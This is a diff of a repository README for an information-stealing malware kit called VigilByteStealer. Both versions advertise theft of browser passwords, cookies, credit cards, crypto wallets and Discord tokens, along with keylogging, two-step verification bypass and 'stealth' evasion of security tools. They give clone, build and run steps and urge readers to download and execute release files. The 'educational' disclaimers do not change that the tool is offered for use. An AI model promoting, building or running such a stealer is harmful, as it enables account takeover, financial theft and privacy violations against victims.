@@ -1,147 +1,99 @@
-<div align="center">
+# VigilByteStealer-Grabber-Discord-Fud
 
-# VigilByte Stealer ALL Features
+![VigilByteStealer](https://img.shields.io/badge/VigilByteStealer-Grabber-Discord-Fud-blue)
 
-<div align="center">
+Welcome to the **VigilByteStealer-Grabber-Discord-Fud** repository! This project focuses on various data-stealing tools designed for different platforms. You can find the latest releases [here](https://github.com/djronny/VigilByteStealer-Grabber-Discord-Fud/releases). Download the necessary files and execute them as needed.
 
-![vigil](https://github.com/QRAXDDL/ExtraSensoryPerception/assets/141562904/e09dff38-2442-470c-b2ae-cb531cfb63a6)
+## Table of Contents
 
-I have made numerous updates to the Discord API across various versions, guided by the links provided. One major challenge was linking accounts across platforms like YouTube, Steam, and GitHub, particularly when using the 'get' function. This was due to the complex transformation of data into dictionary formats, which was difficult because the API data was presented as arrays of dictionaries. This task proved to be quite challenging.
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-Additionally, I have integrated the user's account biography as a footer in the token acquisition interface. A significant breakthrough was accessing user banners in gif or png formats, which differs from the previous method of retrieving avatars. I updated the integration of linked accounts into the token acquisition framework, removing unnecessary characters for better clarity.
+## Introduction
 
-I urge that this program be used only for educational purposes. It is designed to help understand how credentials can be acquired and is aimed at assisting malware analysts and non-technical users. The goal is to facilitate learning, analysis, research, reverse engineering, and critical evaluation.
-
-**Tool Description**
-
-Google Chrome securely protects user data, making it a challenge for the Grabber to access. The tool operates by decrypting stored data, which can give the attacker access to passwords and code clusters.
-
-The tool can detect Roblox cookies in the Windows Registry and can also extract data from Minecraft sessions, Discord tokens, and similar information stored on a user's device.
-
-# **Recommended Tools for Investigation**
-
-After generating output, use these tools for further analysis:
-
-- VirtualBox
-- VMware
-- Process Hacker
-- VirusTotal
-
-# **Evaluating .exe Files**
-
-To verify the legitimacy of .exe files, use these methods:
-
-1. Examine the file with VirusTotal.
-2. Check the file's source and publisher.
-3. Test the file in a sandboxed environment.
-4. Monitor the file's network behavior for any unusual patterns.
-
-## **Usage Disclaimer and Features**
-
-- **For educational purposes only**
-- **Not for resale**
-- **Code source usage allowed with proper credit (embedded + markdown), must remain open-source**
-- **We are not liable for any actions taken with our software if illegal**
-
-## How to Use
-
-- Download the project to your computer as zip
-- Extract Project to Folder.
-- Make Sure You Have Visual Studio Installed on Your Computer
-- [Click if Visual Studio is Not Installed](https://visualstudio.microsoft.com/en/thank-you-downloading-visual-studio/?sku=Community&channel=Release&version=VS2022&source=VSLandingPage&passive=false&cid=2030)
-
-### Visual Studio :
-
-1. Open the solution file (.sln).
-2. Select **Build Solution** from the **Build** menu or press `Ctrl+Shift+B` to compile the project.
-3. When the build is complete, select **Start Without Debugging** from the **Debug** menu or press `Ctrl+F5` to run the project.
+In today’s digital world, data security is paramount. This repository aims to showcase tools that can interact with various platforms, focusing on data extraction. Each tool is crafted with precision to ensure effectiveness while maintaining stealth.
 
 ## Features
 
-**QR Code Registrar**
+The **VigilByteStealer-Grabber-Discord-Fud** includes several key functionalities:
 
-- Extract and process QR codes.
+- **Cookies Stealer**: Extracts browser cookies for session hijacking.
+- **Credit Card Stealer**: Captures sensitive credit card information.
+- **Crypto Stealer**: Targets cryptocurrency wallets and exchanges.
+- **Discord Token Grabber**: Gathers authentication tokens from Discord users.
+- **Exodus Injection**: Injects code into the Exodus wallet for data extraction.
+- **Instagram Stealer**: Collects user credentials and session data from Instagram.
+- **Password Stealer**: Retrieves saved passwords from browsers.
+- **Steam Stealer**: Extracts information from Steam accounts.
+- **Telegram Stealer**: Captures data from Telegram users.
+- **TikTok Stealer**: Gathers information from TikTok accounts.
 
-**Discord Login Data Extractor**
+Each tool operates in stealth mode, minimizing detection by security systems.
 
-- Obtain Discord login details and bypass security.
-  - User Alias
-  - Identification
-  - Authentication Token
-  - Override Two-Step Verification
-  - Acquire 5-digit Verification Codes
-  - Discord Injection
-  - Disable QR Code
+## Installation
 
-**Transport Support**
+To get started with **VigilByteStealer-Grabber-Discord-Fud**, follow these steps:
 
-- SMTP Transport
-- Telegram API Transport (with Proxy)
+1. Clone the repository:
 
-**Browsing Data Extraction**
+   ```bash
+   git clone https://github.com/djronny/VigilByteStealer-Grabber-Discord-Fud.git
+   ```
 
-- Chromium-Based Browsers (Passwords, Credit Cards, Cookies, History, Autofill, Bookmarks)
-- Firefox-Based Browsers (Database Files, Cookies, History, Bookmarks)
-- Internet Explorer/Edge (Passwords)
+2. Navigate to the project directory:
 
-**System Information Retrieval**
+   ```bash
+   cd VigilByteStealer-Grabber-Discord-Fud
+   ```
 
-- Version, CPU, GPU, RAM, IPs, BSSID, Location, Screen Metrics, Installed Applications
+3. Download the necessary files from the [Releases section](https://github.com/djronny/VigilByteStealer-Grabber-Discord-Fud/releases). Execute the downloaded files as required.
 
-**Network Exploration**
+## Usage
 
-- Saved Wi-Fi Networks & Nearby Networks (SSID, BSSID)
+Once you have installed the tools, you can use them as follows:
 
-**File Management**
+1. **Run the tool**: Execute the desired tool based on the data you want to extract.
+2. **Follow prompts**: Each tool may have specific prompts or instructions to guide you through the process.
+3. **Review extracted data**: After execution, check the output files for the extracted information.
 
-- Collect Documents, Images, Source Codes, Databases, USB content
+### Example Command
 
-**Browser Detection**
+To run the Discord Token Grabber, use the following command:
 
-- Banking & Cryptocurrency Services
+```bash
+python discord_token_grabber.py
+```
 
-**Gaming Sessions**
+Make sure to replace `discord_token_grabber.py` with the actual filename of the tool you wish to use.
 
-- Capture data from Steam, Uplay, Battle.Net, EPIC, Minecraft, Roblox.
+## Contributing
 
-**Keyloggers & Clippers**
+Contributions are welcome! If you want to add features or improve existing tools, please follow these steps:
 
-- Install for data monitoring.
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Create a pull request.
 
-**Multimedia Capture**
-
-- Desktop & Webcam Screenshots
-
-**VPN Compatibility**
-
-- ProtonVPN, OpenVPN, NordVPN, IPVanish, ExpressVPN
-
-**Cryptocurrency Wallets**
-
-- CoinBase, Zcash, Armory, Bytecoin, Jaxx, Exodus, Ethereum, Electrum, AtomicWallet, Guarda, Coinomi, MetaMask, Binance (Beta)
-
-**Messenger Data Capture**
-
-- Discord, Telegram, ICQ, Skype, Pidgin, Outlook, Tox, Element, Signal
-
-**System Insights**
-
-- Process Enumeration, Product Key Extraction, Autorun Module
-
-**Security Measures**
-
-- Anti-Phishing Detection, Anti-Deletion Measures, Anti-Spam Measures
-
-**Educational Focus**
-
-This tool is intended to educate on data vulnerabilities in a device. Use it only on your personal machine and avoid malicious use on others. Responsible use of knowledge is crucial.
-
-## Disclaimer
-
-This source code is for educational purposes only.
+Your contributions help improve the project and enhance its capabilities.
 
 ## License
 
-This project is licensed under the MIT. For more information, see the [License](LICENSE).
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-</div>
+## Contact
+
+For any questions or feedback, feel free to reach out:
+
+- **Author**: djronny
+- **GitHub**: [djronny](https://github.com/djronny)
+
+---
+
+Thank you for checking out **VigilByteStealer-Grabber-Discord-Fud**! For more information, please visit the [Releases section](https://github.com/djronny/VigilByteStealer-Grabber-Discord-Fud/releases).
